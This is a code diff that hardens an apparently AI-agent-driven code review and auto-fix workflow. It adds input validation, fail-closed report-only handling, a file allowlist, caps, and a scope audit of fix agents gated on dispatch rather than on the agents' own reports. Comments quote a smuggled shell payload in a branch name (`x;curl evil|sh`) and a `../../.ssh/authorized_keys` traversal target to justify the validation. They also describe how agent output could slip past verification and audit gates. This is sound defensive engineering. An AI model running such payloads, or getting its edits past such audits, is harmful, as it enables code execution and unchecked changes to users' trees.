@@ -13,8 +13,6 @@ export const meta = {
 
 const A = args || {}
 const FABLE = A.fable === true
-const REPORT_ONLY = A.reportOnly === true
-const FILES = Array.isArray(A.files) ? A.files : []
 const CHANGED_LINES = typeof A.changedLines === 'number' ? A.changedLines : 0
 const REQUESTED = Array.isArray(A.lenses) && A.lenses.length ? A.lenses : ['A', 'B', 'C', 'D']
 const VERIFY_CAP = 8
@@ -31,6 +29,90 @@ const MIN_SCENARIO_CHARS = 20
 const MAX_FIELD_CHARS = 600
 const SEV = ['LOW', 'MEDIUM', 'HIGH', 'CRITICAL']
 const CORE = ['A', 'B', 'C', 'D']
+// Ceiling on fix agents dispatched in one run. Each holds Edit on the user's
+// real working tree and they all run at once, so an unbounded fan-out is an
+// unbounded blast radius — and the count is set by how many distinct files the
+// finders named, which is model output. Overflow files are reported, not
+// patched, exactly like `invasive`.
+//
+// Tied to VERIFY_CAP rather than picked independently. Only CONFIRMED findings
+// are patchable and a verdict costs a verifier slot, so the fan-out is ALREADY
+// bounded by VERIFY_CAP today and this constant never trips. That is the point:
+// raising VERIFY_CAP must not silently raise the number of agents editing the
+// user's tree in parallel without someone deciding it should.
+const MAX_FIX_FILES = VERIFY_CAP
+
+// -------------------------------------------------- untrusted argument gates
+//
+// Everything below arrives as JSON from the slash command, which built it from
+// `gh`, `git` and a diff. None of it is this workflow's own text.
+
+// Auto-fix is the only thing here that writes to the user's tree, and two
+// forced-safety paths in the command — PR head ≠ working tree, and a missing
+// rollback anchor on a dirty tree — depend on `reportOnly: true` arriving
+// intact. `A.reportOnly === true` failed OPEN on every near-miss the JSON
+// boundary can produce: the string `'true'`, `1`, a misspelt key, an omitted
+// key. Each of those silently re-enabled editing on precisely the paths that
+// asked for it to stop. Auto-fix therefore requires the literal `false` and
+// nothing else; anything else, including absence, is report-only.
+const REPORT_ONLY = A.reportOnly !== false
+// Distinguishes "the user passed --report-only" from "the caller sent something
+// this workflow refused to read as consent to edit". The second is a caller bug
+// and must not render as a user choice.
+const REPORT_ONLY_INFERRED = REPORT_ONLY && A.reportOnly !== true
+
+// `repoPath` and `diffRange` are interpolated into shell commands the briefs
+// tell agents to run (`git diff <range> -- <path>`, the `expandCmd` line). A
+// git ref is not a safe shell token: `git switch -c 'x;curl evil|sh'` is a legal
+// branch name, and `diffRange` in PR Mode is built from a PR's head branch —
+// attacker-controlled text on its way to a shell an agent will execute.
+// Refused rather than escaped: quoting rules differ between the shells an agent
+// may reach for, and a review that omits one convenience command is a smaller
+// loss than one that runs someone else's.
+const SHELL_SAFE_RE = /^[A-Za-z0-9._/@+=:,^~-]+$/
+function shellSafe(raw) {
+  const s = String(raw == null ? '' : raw).trim()
+  return s && s.length <= 256 && SHELL_SAFE_RE.test(s) ? s : ''
+}
+
+const REPO_PATH = shellSafe(A.repoPath)
+const DIFF_RANGE = shellSafe(A.diffRange)
+// `expandCmd` is a whole command line, so it legitimately contains spaces and
+// the literal `<path>` / `<ordinal>` placeholders the agent substitutes before
+// running it. It is admitted only when it is the `ironmem review-diff`
+// invocation the command documents and carries nothing that could start a
+// second command. The two placeholders are removed before the angle-bracket
+// check so the documented form passes while a stray redirect does not.
+function expandCmdOk(cmd) {
+  if (typeof cmd !== 'string' || cmd.length > 512) return false
+  if (!cmd.startsWith('ironmem review-diff ')) return false
+  if (/[;&|$`\n\r*?!\\'"]/.test(cmd)) return false
+  return !/[<>]/.test(cmd.split('<path>').join('').split('<ordinal>').join(''))
+}
+const EXPAND_CMD = expandCmdOk(A.expandCmd) ? A.expandCmd : ''
+
+// The anchor is the whole recovery story: it scopes the scope audit and it is
+// the sha in the `git checkout <sha> -- .` line the report prints. An empty or
+// malformed value degrades that line to `git checkout -- .`, which does not
+// restore anything — it DISCARDS every unstaged change in the tree, including
+// the work under review. So it is validated as an object name here, and without
+// a usable one there is no auto-fix at all: nothing may edit a tree it cannot
+// undo.
+const ROLLBACK_SHA = /^[0-9a-f]{7,64}$/.test(String(A.rollbackSha || '').trim())
+  ? String(A.rollbackSha).trim()
+  : ''
+const NO_ANCHOR = !ROLLBACK_SHA
+
+// Repo-relative, no traversal, no absolute paths. This is the allowlist the fix
+// dispatch checks findings against, so it is built from the caller's file list
+// rather than from anything a finder said.
+function normPath(p) {
+  return String(p == null ? '' : p)
+    .replace(/^\.\//, '')
+    .trim()
+}
+const FILES = (Array.isArray(A.files) ? A.files : []).map(normPath).filter(Boolean)
+const REVIEWED = new Set(FILES)
 
 // ------------------------------------------------------------- roster
 
@@ -94,7 +176,20 @@ function selectFor() {
   return [...new Set([...REQUESTED, ...eligible])]
 }
 
-const SELECTED = selectFor().filter((id) => ROSTER[id])
+// A roster that narrows to nothing is the quietest way this command can lie.
+// `lenses: ['H', 'J']` on a small diff is enough: the band keeps only core ids,
+// both are dropped, zero agents are dispatched, `findings` comes back `[]`, and
+// row 1 of the decide table — "zero remaining CRITICAL/HIGH, validation passes"
+// — matches. A review that looked at nothing reports APPROVE.
+//
+// Falling back to the core four is the honest reading of the band rule rather
+// than a patch over it: `small` means "core lenses only", and if the caller
+// named no core lens then the band's answer is the core four, not silence. The
+// widening is reported so the roster stays auditable in this direction too.
+let selected = selectFor().filter((id) => ROSTER[id])
+const ROSTER_WIDENED = selected.length === 0
+if (ROSTER_WIDENED) selected = CORE.slice()
+const SELECTED = selected
 // A requested id that no lens implements is a typo or a stale caller, not a
 // band decision — it is reported on its own line so it cannot be misread as
 // one, and it is kept out of DROPPED_BY_BAND for the same reason.
@@ -115,7 +210,19 @@ if (DROPPED_BY_BAND.length) {
 if (ADDED_BY_BAND.length) {
   log(`band=${BAND} (${CHANGED_LINES} changed lines, ${FILES.length} files) — expanded to the full roster, added: ${ADDED_BY_BAND.join(', ')}`)
 }
+if (ROSTER_WIDENED) {
+  log(`band=${BAND} left no lens to run from lenses=[${REQUESTED.join(', ')}] — widened to the core four rather than reviewing nothing`)
+}
 if (FABLE_SUGGESTED) log('this diff qualifies for --fable')
+if (NO_ANCHOR) {
+  log('no usable rollback anchor (rollbackSha absent or not an object name) — report-only forced; nothing will be edited')
+}
+if (REPORT_ONLY_INFERRED && A.reportOnly !== undefined) {
+  log(`reportOnly arrived as ${JSON.stringify(A.reportOnly)}, not the boolean false — treating as report-only rather than assuming consent to edit`)
+}
+if (!FILES.length) {
+  log('no changed-file list was passed — every finding is outside the reviewed set, so nothing can be patched')
+}
 
 // ------------------------------------------------------------ schemas
 
@@ -273,14 +380,14 @@ function asData(text) {
 
 function sharedInputs() {
   return [
-    `Repo: ${A.repoPath}`,
-    `Mode: ${A.mode}`,
-    `Diff range: ${A.diffRange}`,
+    REPO_PATH ? `Repo: ${REPO_PATH}` : '',
+    `Mode: ${asData(A.mode)}`,
+    DIFF_RANGE ? `Diff range: ${DIFF_RANGE}` : '',
     `Changed files (${FILES.length}):\n${FILES.map((f) => `  - ${f}`).join('\n')}`,
     A.context ? `Context:\n${A.context}` : '',
     `Review input:\n${A.reviewInput}`,
-    A.expandCmd
-      ? `To expand an indexed file/hunk to exact source, run:\n  ${A.expandCmd}\n(substitute the real <path> and <ordinal>). A targeted \`git diff ${A.diffRange} -- <path>\` also works.`
+    EXPAND_CMD
+      ? `To expand an indexed file/hunk to exact source, run:\n  ${EXPAND_CMD}\n(substitute the real <path> and <ordinal>).${DIFF_RANGE ? ` A targeted \`git diff ${DIFF_RANGE} -- <path>\` also works.` : ''}`
       : '',
     'Inspect changed source and its callers independently before reading whole files. Review what changed, not the whole codebase.',
   ]
@@ -425,6 +532,28 @@ function keyOf(f) {
   return `${f.file}:0:${signature(f.issue)}`
 }
 
+// The identity of a VERDICT, as distinct from the identity of a finding.
+//
+// `verifyOnce` used to memoise on `keyOf` — a location — while the cross-lens
+// merge below picks the primary wording by failure-scenario length. Those are
+// two independent selections over the same set, so the verdict printed beside a
+// finding, and carried into the fix brief, was reached about whichever wording
+// happened to ARRIVE first, not the one displayed. It failed in both directions:
+// a real CRITICAL filed under `refuted[]` because an unrelated claim at that
+// line was refuted, and an unverified claim reaching an Edit-capable agent under
+// the sentence "independently confirmed by an adversarial verifier". The
+// CONFIRMED-only fix gate — constraint #1 — was bypassable by wording swap.
+//
+// So the memo key is the claim itself: exactly the fields `verifierBrief`
+// interpolates. Two lenses that word one defect identically still share a
+// verifier; two that word it differently get one each, and every verdict is
+// attached to the text it was reached about. That costs verify budget on
+// cross-lens duplicates, which is the honest price of the guarantee and is
+// logged at the end rather than hidden.
+function claimKey(f) {
+  return `${f.file}:${f.line}|${f.issue}|${f.failure_scenario}`
+}
+
 // First 8 normalised words of the issue text — enough to tell two file-level
 // claims apart without demanding that two lenses phrase one identically.
 function signature(issue) {
@@ -463,7 +592,7 @@ function verifierBrief(f) {
     `${asData(f.file)}:${f.line} — ${asData(f.issue)} — ${asData(f.failure_scenario)}`,
     '</finding>',
     '',
-    `Repo: ${A.repoPath}. Diff range: ${A.diffRange}.`,
+    [REPO_PATH ? `Repo: ${REPO_PATH}.` : '', DIFF_RANGE ? `Diff range: ${DIFF_RANGE}.` : ''].filter(Boolean).join(' '),
     '',
     'Read the actual code, trace the claimed path, check the claimed inputs can actually reach it. Verdict: `CONFIRMED` (quote the code path that proves it), `REFUTED` (quote the guard/invariant that prevents it), or `PLAUSIBLE` (could not prove either way). One paragraph max.',
     '',
@@ -480,14 +609,20 @@ const verifyCache = new Map()
 // while slots were still open. That is a deferral, not a verdict, and it is the
 // only cache entry a later CRITICAL is allowed to overturn.
 const reserveBlocked = new Set()
+// Claims a verifier actually ran on, versus claims a merged finding ended up
+// displaying. The difference is budget spent on a wording the merge then
+// displaced, and it is reported rather than absorbed.
+const dispatchedClaims = new Set()
 let verifyBudget = VERIFY_CAP
 let pastCap = 0
 
-// Memoised by finding key, so two lenses reporting the same defect share one
-// verifier instead of racing two. JS is single-threaded up to the first await,
-// so the cache write always beats a concurrent second caller.
+// Memoised by CLAIM — see `claimKey`. Two lenses wording one defect identically
+// share a verifier instead of racing two; two wording it differently each get a
+// verdict about their own wording, because that is what the verifier was asked
+// about and what the report prints beside it. JS is single-threaded up to the
+// first await, so the cache write always beats a concurrent second caller.
 function verifyOnce(f) {
-  const k = keyOf(f)
+  const k = claimKey(f)
   // Two lenses can disagree on severity at one file:line. If the HIGH arrived
   // first and was deferred by the reserve, the CRITICAL behind it must not
   // inherit that deferral — the reserve exists for exactly this finding, and
@@ -535,6 +670,7 @@ function verifyOnce(f) {
     reserveBlocked.delete(k)
   }
   verifyBudget -= 1
+  dispatchedClaims.add(k)
 
   const p = agent(verifierBrief(f), {
     label: `verify:${f.file}:${f.line}`,
@@ -573,9 +709,13 @@ function groupTier(list) {
 
 function fixBrief(file, list) {
   return [
-    `Apply the minimal correct fix for each verified finding in \`${file}\`. Every finding below was independently confirmed by an adversarial verifier whose job was to refute it — treat them as real defects.`,
+    // The claim in this sentence is only true because the verify memo is keyed
+    // to the claim text below, not to its file:line — see `claimKey`. Under a
+    // location key the numbered wording here could be one the verifier never
+    // read. Do not weaken either end of that pairing independently.
+    `Apply the minimal correct fix for each verified finding in \`${file}\`. Every NUMBERED finding below was independently confirmed by an adversarial verifier whose job was to refute that exact wording — treat them as real defects.`,
     '',
-    `Repo: ${A.repoPath}`,
+    `Repo: ${REPO_PATH}`,
     `File: ${file}`,
     '',
     // Same untrusted-data framing as the verifier brief, and it matters more
@@ -590,12 +730,14 @@ function fixBrief(file, list) {
           `   suggested fix: ${asData(f.suggested_fix)}`,
           `   verifier evidence: ${asData(f.verification.evidence)}`,
           // Another lens's wording of the same location, which may describe a
-          // second and distinct defect there. The verifier ruled on the primary
+          // second and distinct defect there. The verifier ruled on the numbered
           // wording only, so without this the merged-in claim would be neither
-          // fixed nor surfaced as unfixed.
+          // fixed nor surfaced as unfixed — but it is explicitly NOT covered by
+          // the confirmation sentence at the top of this brief, and must not
+          // inherit it by sitting inside a confirmed finding's entry.
           ...(f.also_reported && f.also_reported.length
             ? [
-                `   also reported at this location by another lens — may be a separate defect; fix it too if it is real, otherwise account for it in your note: ${f.also_reported
+                `   UNVERIFIED lead — another lens described this location differently and no verifier ruled on this wording. It may be a separate defect: fix it only if reading the code shows it is real, otherwise account for it in your note. ${f.also_reported
                   .map((t) => `"${asData(t)}"`)
                   .join('; ')}`,
               ]
@@ -621,10 +763,15 @@ function auditBrief(files) {
   return [
     'Audit an auto-fix patch set for scope creep. Read only the patch.',
     '',
-    `Run: \`git -C ${A.repoPath} diff ${A.rollbackSha} -- .\`. Also run \`git status --porcelain\` in ${A.repoPath}.`,
-    `Together those cover exactly the fixes applied by this review: ${A.rollbackSha} is a snapshot taken before the first edit, and a fix agent can also create new files — the diff range alone will not show those, so treat any untracked ("??") entries from the porcelain status as fix output too, not scope creep.`,
+    `Run: \`git -C ${REPO_PATH} diff ${ROLLBACK_SHA} -- .\`. Also run \`git status --porcelain\` in ${REPO_PATH}.`,
+    `Together those cover exactly the fixes applied by this review: ${ROLLBACK_SHA} is a snapshot taken before the first edit, and a fix agent can also create new files — the diff range alone will not show those, so treat any untracked ("??") entries from the porcelain status as fix output too, not scope creep.`,
     '',
     `Files the fix agents were authorised to touch:\n${files.map((f) => `  - ${f}`).join('\n')}`,
+    '',
+    // The audit is dispatched on the fact that Edit-capable agents ran, not on
+    // their own account of what they did. Say so, or the auditor will read an
+    // empty diff as confirmation of a report it has no reason to trust.
+    'Agents holding Edit were dispatched against those files. Some may have reported changing nothing, or may have failed before reporting at all; neither is evidence that the tree is unchanged. Report what the diff and the porcelain status actually show, including "no changes present".',
     '',
     'Answer one question: does this patch set do what the findings asked and nothing else? Flag any hunk that is a refactor, a rename, a reformat of untouched lines, a new dependency, a test change unrelated to a finding, or an edit to a file not listed above. Do not edit anything.',
   ].join('\n')
@@ -694,13 +841,29 @@ for (const res of lensResults) {
 }
 
 const all = [...merged.values()]
+const consumedClaims = new Set()
 for (const f of all) {
-  // Already resolved for anything verified during the pipeline; only a finding
-  // escalated by the cross-lens merge costs a fresh verifier here.
-  f.verification =
-    f.severity === 'CRITICAL' || f.severity === 'HIGH'
-      ? await verifyOnce(f)
-      : { verdict: 'N/A', evidence: '', fix_complexity: 'mechanical', fix_class: 'other' }
+  // The lookup is by the MERGED finding's own claim — the wording this run will
+  // print and hand to a fix agent — so the verdict it gets back is a verdict
+  // about that wording and nothing else. Anything eagerly verified during the
+  // pipeline that survived the merge intact hits the cache; a wording the merge
+  // promoted from a lens that reported it below CRITICAL/HIGH, or a finding the
+  // merge escalated, costs a fresh verifier here.
+  if (f.severity === 'CRITICAL' || f.severity === 'HIGH') {
+    consumedClaims.add(claimKey(f))
+    f.verification = await verifyOnce(f)
+  } else {
+    f.verification = { verdict: 'N/A', evidence: '', fix_complexity: 'mechanical', fix_class: 'other' }
+  }
+}
+
+// The price of keying verdicts to claims: a lens whose wording the merge then
+// displaced spent a slot on a verdict nothing displays. Reported, because a
+// silently smaller effective cap is exactly the kind of invisible shortfall this
+// review is supposed to surface rather than commit.
+const supersededVerdicts = [...dispatchedClaims].filter((k) => !consumedClaims.has(k)).length
+if (supersededVerdicts > 0) {
+  log(`${supersededVerdicts} verifier slot(s) went to a wording the cross-lens merge later displaced — each verdict belongs to its own wording, so it could not be reused`)
 }
 
 const refuted = all.filter((f) => f.verification.verdict === 'REFUTED')
@@ -712,31 +875,76 @@ const verifyStats = {
   refuted: refuted.length,
   unverified: surviving.filter((f) => f.verification.verdict === 'UNVERIFIED').length,
 }
-if (pastCap > 0) log(`${pastCap} CRITICAL/HIGH finding(s) past the verification cap of ${VERIFY_CAP} — tagged UNVERIFIED, not fixed`)
+// `pastCap` counts CLAIMS, `verifyStats.unverified` counts merged FINDINGS that
+// ended up displaying an UNVERIFIED verdict. They are not the same number and
+// saying "findings" for both would overstate the second: a capped claim whose
+// location also carried a verified wording is displaced into `also_reported`,
+// where it shows as an unverified lead rather than as an unverified finding.
+if (pastCap > 0) {
+  log(`${pastCap} CRITICAL/HIGH claim(s) past the verification cap of ${VERIFY_CAP} — never verified, never fixed; ${verifyStats.unverified} finding(s) display an UNVERIFIED verdict`)
+}
 // Makes the reserve's price visible: slots held back for CRITICALs that never
 // arrived, while HIGHs went unverified for want of exactly those slots.
 if (pastCap > 0 && verifyBudget > 0) {
-  log(`${verifyBudget} verifier slot(s) reserved for CRITICALs went unspent while ${pastCap} finding(s) stayed UNVERIFIED — the cost of holding the reserve`)
+  log(`${verifyBudget} verifier slot(s) reserved for CRITICALs went unspent while ${pastCap} claim(s) stayed unverified — the cost of holding the reserve`)
 }
 
 // CONFIRMED only. Never PLAUSIBLE, never UNVERIFIED, never before this point.
 const confirmed = surviving.filter((f) => f.verification.verdict === 'CONFIRMED')
 const invasive = confirmed.filter((f) => f.verification.fix_complexity === 'invasive')
-const fixable = REPORT_ONLY ? [] : confirmed.filter((f) => f.verification.fix_complexity !== 'invasive')
 
-if (REPORT_ONLY && confirmed.length) log(`--report-only: ${confirmed.length} confirmed finding(s) left unpatched`)
-if (invasive.length) log(`${invasive.length} confirmed finding(s) classified invasive — reported, never patched`)
+// `file` is model-generated. `normalize` strips newlines and backticks from it
+// so it cannot break a brief's framing, but a syntactically clean path is not a
+// path this review is allowed to edit: `../../.ssh/authorized_keys` survives
+// sanitising intact. The only defensible allowlist is the caller's own changed-
+// file list — the set the lenses were pointed at — so a finding naming anything
+// else is reported and never dispatched. The scope auditor is not a substitute
+// here: it reads the diff of a tree that has already been written to.
+//
+// `invasive` is excluded from the filter so a finding cannot land in two
+// never-patched buckets with two different outcomes — invasive entries carry no
+// `outcome` at all, by contract with the report.
+const outOfScope = confirmed.filter((f) => f.verification.fix_complexity !== 'invasive' && !REVIEWED.has(f.file))
+if (outOfScope.length) {
+  log(`${outOfScope.length} confirmed finding(s) name files outside the reviewed set — reported, never patched: ${[...new Set(outOfScope.map((f) => f.file))].join(', ')}`)
+}
+
+// Every gate that stops this run from editing, in one place, so none of them can
+// be satisfied by a value the run computed about itself.
+const CAN_FIX = !REPORT_ONLY && !NO_ANCHOR && FILES.length > 0
+const patchable = confirmed.filter((f) => f.verification.fix_complexity !== 'invasive' && REVIEWED.has(f.file))
 
 // One agent per file, all files in parallel. No worktree isolation: the fixes
 // must land in the user's working tree.
 const byFile = new Map()
-for (const f of fixable) {
-  if (!byFile.has(f.file)) byFile.set(f.file, [])
-  byFile.get(f.file).push(f)
+if (CAN_FIX) {
+  for (const f of patchable) {
+    if (!byFile.has(f.file)) byFile.set(f.file, [])
+    byFile.get(f.file).push(f)
+  }
 }
+
+// Overflow is dropped from the dispatch set, not silently truncated inside it —
+// the dropped findings must still fold back as unpatched and reach the report.
+const overflowFiles = [...byFile.keys()].slice(MAX_FIX_FILES)
+for (const file of overflowFiles) byFile.delete(file)
+if (overflowFiles.length) {
+  log(`${overflowFiles.length} file(s) past the fix cap of ${MAX_FIX_FILES} — reported, never patched: ${overflowFiles.join(', ')}`)
+}
+
+const fixable = [...byFile.values()].flat()
+// Only meaningful when this run could fix at all. Under report-only nothing is
+// dispatched by design, so every finding is "not dispatched" and tagging them
+// individually would both misstate the reason and break the report-only
+// contract that confirmed findings appear plainly under Remaining.
+const unpatched = CAN_FIX ? patchable.filter((f) => !byFile.has(f.file)) : []
+
+if (REPORT_ONLY && confirmed.length) log(`report-only: ${confirmed.length} confirmed finding(s) left unpatched`)
+if (invasive.length) log(`${invasive.length} confirmed finding(s) classified invasive — reported, never patched`)
 
 phase('Fix')
 let groups = []
+const fixDispatchErrors = []
 if (byFile.size > 0) {
   groups = (
     await parallel(
@@ -753,7 +961,32 @@ if (byFile.size > 0) {
           model: tier.model,
           effort: tier.effort,
           schema: FIX_SCHEMA,
-        }).then((r) => ({ file, tier: `${tier.model}/${tier.effort}`, results: (r && r.results) || [] }))
+        })
+          .then((r) => ({
+            file,
+            tier: `${tier.model}/${tier.effort}`,
+            // `(r && r.results) || []` admitted a string, an object, a number —
+            // anything truthy — and the fold-back below iterates it. Only an
+            // array is a result set.
+            results: r && Array.isArray(r.results) ? r.results : [],
+            errored: false,
+            errorReason: '',
+          }))
+          // This is the ONE agent call in the review that mutates the user's
+          // tree, and it was the one call with no catch — Find, Verify and Audit
+          // all had one. `parallel` rejects on the first rejection, so a single
+          // fix agent dying threw out of the workflow entirely: no return
+          // struct, no findings, no scope audit, no coverage table — while its
+          // siblings had already edited files. The user was left with a thrown
+          // tool call over a modified tree and nothing describing either.
+          // A rejection here is recorded and the run continues to the audit,
+          // which is the phase that exists to look at that tree.
+          .catch((e) => {
+            const why = asData((e && e.message) || 'fix agent call failed').slice(0, 160)
+            fixDispatchErrors.push({ file, reason: why })
+            log(`fix agent for ${file} errored — it may have edited the file before failing: ${why}`)
+            return { file, tier: `${tier.model}/${tier.effort}`, results: [], errored: true, errorReason: why }
+          })
       }),
     )
   ).filter(Boolean)
@@ -769,10 +1002,18 @@ if (byFile.size > 0) {
 // `applied` of 0 — which trips the `applied > 0` guard below and silently
 // skips the scope audit on a tree that really was edited. Indexing also stops
 // the fold-back depending on an agent echoing file/line back verbatim.
+const OUTCOMES = ['fixed', 'skipped', 'no_change_needed']
 const outcomeByIndex = new Map()
+const erroredFiles = new Set()
 for (const g of groups) {
+  if (g.errored) erroredFiles.add(g.file)
   for (const r of g.results) {
-    if (Number.isInteger(r.index)) outcomeByIndex.set(`${g.file}#${r.index}`, r)
+    // `outcome` is a schema-constrained enum, but the schema is enforced by the
+    // model that produced it. `applied` is counted off this field, so an
+    // unrecognised value must not fall through as anything.
+    if (r && Number.isInteger(r.index) && OUTCOMES.includes(r.outcome)) {
+      outcomeByIndex.set(`${g.file}#${r.index}`, r)
+    }
   }
 }
 for (const [file, list] of byFile) {
@@ -781,8 +1022,27 @@ for (const [file, list] of byFile) {
     // stays `skipped` and says why, rather than being matched by guesswork.
     const r = outcomeByIndex.get(`${file}#${i + 1}`)
     f.outcome = r ? r.outcome : 'skipped'
-    f.outcome_note = r ? r.note : 'no fix-agent result could be matched to this finding by index'
+    f.outcome_note = r
+      ? String(r.note == null ? '' : r.note)
+      : erroredFiles.has(file)
+        ? 'the fix agent for this file errored before returning a result — the file may still have been edited'
+        : 'no fix-agent result could be matched to this finding by index'
   })
+}
+// Findings that were eligible but never dispatched — over the file cap, or held
+// back by a gate. They are `skipped` with a reason so the report counts them as
+// remaining instead of losing them between `confirmed` and `fixes`.
+for (const f of unpatched) {
+  f.outcome = 'skipped'
+  f.outcome_note = 'over the per-run fix-file cap — reported, not dispatched to a fix agent'
+}
+// Same gate, same reason: under report-only nothing was dispatched anywhere, so
+// singling these out as skipped would read as a decision this run did not make.
+if (CAN_FIX) {
+  for (const f of outOfScope) {
+    f.outcome = 'skipped'
+    f.outcome_note = 'names a file outside the reviewed changed-file set — never dispatched to a fix agent'
+  }
 }
 
 const applied = fixable.filter((f) => f.outcome === 'fixed').length
@@ -790,7 +1050,19 @@ log(`fixes applied: ${applied} across ${byFile.size} file(s)`)
 
 phase('Audit')
 let scopeAudit = null
-if (applied > 0) {
+// Gated on whether a fix agent was DISPATCHED, never on what one reported.
+//
+// `applied` is derived entirely from the agents' own `outcome` strings, so
+// gating the audit on `applied > 0` let the audited party decide whether it gets
+// audited. Every one of these produces `applied === 0` over a tree that really
+// was written to: an agent that edits and then returns `no_change_needed`, an
+// agent that edits and then dies, an agent that returns an index the fold-back
+// cannot match. The report then printed "n/a (no fixes applied)" across a
+// modified working tree — the audit skipped by exactly the failure it exists to
+// catch. Dispatch is the ground truth available here: an agent holding Edit was
+// pointed at these files, so the diff gets read either way.
+const fixAgentsDispatched = byFile.size > 0
+if (fixAgentsDispatched) {
   scopeAudit = await agent(auditBrief([...byFile.keys()]), {
     label: 'scope-audit',
     phase: 'Audit',
@@ -802,17 +1074,29 @@ if (applied > 0) {
   // `scopeAudit: null` otherwise reads as "no audit was needed". It is not the
   // same thing: fixes are sitting in the working tree unaudited.
   if (!scopeAudit) {
-    log(`scope audit did not return — ${applied} fix(es) are in the working tree unaudited; diff them against ${A.rollbackSha}`)
+    log(`scope audit did not return — ${byFile.size} file(s) were dispatched to fix agents and are unaudited; diff them against ${ROLLBACK_SHA}`)
   }
 }
 
+// Everything Phase 6 needs to decide, and Phase 7 to report, has to be IN here.
+// The command is explicitly forbidden to re-derive state from agent chatter or
+// from this script's `log()` lines, so a signal that exists only as a log line
+// is a signal no decision can ever see — which is how an unrecognised lens id,
+// an errored lens and an empty roster each reached a clean-looking verdict.
 return {
   band: BAND,
   changedLines: CHANGED_LINES,
   fileCount: FILES.length,
   droppedByBand: DROPPED_BY_BAND,
   addedByBand: ADDED_BY_BAND,
+  unrecognisedLenses: UNRECOGNISED,
+  rosterWidened: ROSTER_WIDENED,
   fableSuggested: FABLE_SUGGESTED,
+  // The decide table's own precondition. False means at least one lens
+  // contributed no coverage, so "zero remaining CRITICAL/HIGH" is a statement
+  // about what was looked at, not about the diff.
+  coverageComplete: lensResults.length > 0 && lensResults.every((r) => !r.errored),
+  erroredLenses: lensResults.filter((r) => r.errored).map((r) => r.id),
   coverage: lensResults.map((r) => ({
     id: r.id,
     key: r.key,
@@ -827,8 +1111,30 @@ return {
   findings: surviving,
   refuted,
   invasive,
-  fixes: { applied, files: byFile.size, groups },
+  // Confirmed findings on paths outside the caller's changed-file set. Never
+  // dispatched; they are a signal about the finders as much as about the diff.
+  outOfScope,
+  fixes: {
+    applied,
+    files: byFile.size,
+    groups,
+    // A fix agent that rejected may still have edited the file before it did.
+    // Non-empty here means the tree can hold changes no result set describes.
+    dispatchErrors: fixDispatchErrors,
+    cappedFiles: overflowFiles,
+  },
   scopeAudit,
-  verifyStats,
+  // True whenever Edit-capable agents ran, regardless of what they reported —
+  // this, not `fixes.applied`, is what makes a missing `scopeAudit` a problem.
+  fixAgentsDispatched,
+  verifyStats: { ...verifyStats, pastCap, supersededVerdicts },
   reportOnly: REPORT_ONLY,
+  // Why, so the report can distinguish a flag the user passed from a safety
+  // path that fired.
+  reportOnlyForced: REPORT_ONLY_INFERRED,
+  rollbackSha: ROLLBACK_SHA,
+  // False means the report must not print a `git checkout <sha> -- .` line at
+  // all: with an empty sha that command becomes `git checkout -- .`, which
+  // restores nothing and discards every unstaged change in the tree.
+  rollbackUsable: !NO_ANCHOR,
 }
